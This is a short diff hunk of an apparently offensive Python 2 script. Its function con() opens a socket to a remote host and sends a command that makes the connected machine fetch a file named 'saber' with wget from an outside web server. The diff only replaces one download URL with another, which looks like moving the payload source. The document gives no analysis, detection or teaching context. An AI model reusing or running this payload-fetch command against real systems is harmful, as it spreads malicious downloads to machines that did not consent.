@@ -31,7 +31,7 @@ def con():
 		s.connect((host, port))
 		print "successfully connected"
 		for i in range(1):
-			cmd = "wget http://britishbeauty.cn/temm/saber"
+			cmd = "wget http://sigortaline.com.tr/uploads/saber"
 			result = s.recv(1024).strip()
 			s.send(cmd + "\n")
 		for i in range(1):
